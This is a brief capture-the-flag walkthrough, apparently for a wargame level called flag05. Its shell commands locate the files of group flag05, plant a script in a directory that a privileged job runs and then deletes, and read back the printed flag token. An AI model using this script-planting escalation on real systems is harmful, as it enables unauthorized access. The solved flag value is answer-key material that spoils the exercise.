# try to find any file belonging to flag05
find / -group flag05 2> /dev/null # > /usr/sbin/openarenaserver
# the script in question executes then deletes every script in /opt/openarenaserver/
# simply add another script
echo "#!/bin/bash" > /opt/openarenaserver/test.sh
echo "getflag > /tmp/test" > /opt/openarenaserver/test.sh
# wait for script to be executed then deleted
ls /opt/openarenaserver/test.sh
# once it is deleted, simply
cat /tmp/test #> viuaaale9huek52boumoomioc